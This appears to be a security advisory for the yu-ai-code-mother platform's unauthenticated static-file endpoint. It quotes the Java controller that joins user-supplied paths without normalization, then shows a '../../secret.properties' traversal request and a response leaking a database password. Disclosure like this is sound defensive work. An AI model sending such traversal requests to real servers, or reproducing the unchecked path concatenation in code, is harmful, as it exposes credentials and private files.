# yu-ai-code-mother Unauthenticated Static File Read + Path Traversal (File Read)

## Introduction to Vulnerabilities

The static resource interface `/api/static/{deployKey}/**` of the open-source AI code generation platform **yu-ai-code-mother** (Spring Boot 3.5.3, embedded Tomcat 10.1) is vulnerable to missing authentication and path traversal. The user-controlled path is concatenated to the preview root directory without any normalization, allowing anonymous attackers to read files outside the preview root.

## Affected Versions

yu-ai-code-mother-microservice `yu-ai-code-app` (com.yupi:yu-ai-code-app, Spring Boot 3.5.3 + JDK 21)

## Utilize conditions

- No authentication required (anonymous)

## Vulnerability Reproduction

**Source (user input point)** — `deployKey` and `resourcePath` taken from the URL, no `@AuthCheck` annotation (authentication is AOP-based and skipped entirely without the annotation):

```java
// com/yupi/yuaicodemother/controller/StaticResourceController.java
@GetMapping("/{deployKey}/**")
public ResponseEntity<Resource> serveStaticResource(HttpServletRequest request) {
    String resourcePath = (String) request.getAttribute(
        HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE);
    resourcePath = resourcePath.substring(("/static/" + deployKey).length());
    ...
    String filePath = PREVIEW_ROOT_DIR + "/" + deployKey + resourcePath;  // direct concatenation
    File file = new File(filePath);
    ...
    return ResponseEntity.ok()...body(new FileSystemResource(file));
}
```

![image-20260815145600665](https://github.com/fangtang7/picx-images-hosting/raw/master/YU_AI/image-20260815145600665.41ys8f640o.webp)

**Sink** — direct concatenation without `Path.normalize` / blacklist:

```java
// PREVIEW_ROOT_DIR = user.dir + "/tmp/code_output"
String filePath = PREVIEW_ROOT_DIR + "/" + deployKey + resourcePath;
Resource resource = new FileSystemResource(file);
```

 Path traversal, escape the preview root and read external file:

```
GET /api/static/test_deploy/../../secret.properties HTTP/1.1
Host: 127.0.0.1:8125
```

```
HTTP/1.1 200
DB_PASSWORD=SuperSecret0dayPassword123
```

![image-20260815145331538](https://github.com/fangtang7/picx-images-hosting/raw/master/YU_AI/image-20260815145331538.6bhsrwricd.webp)

(escape path: `{app}/tmp/code_output/test_deploy/../../secret.properties` -> `{app}/tmp/secret.properties`, outside the preview root)

## Impact

Anonymous attackers can read any file under any `deployKey` directory (generated user code / previews) and, via path traversal, files outside the preview root (at least the application `tmp/` directory, which may contain temporary and sensitive data). Traversal depth depends on the deployment container: embedded Tomcat 10.1 blocks 3+ levels of `..` (404) and encoded variants are normalized/refused; behind other containers/reverse proxies the escape depth and impact scope expand.
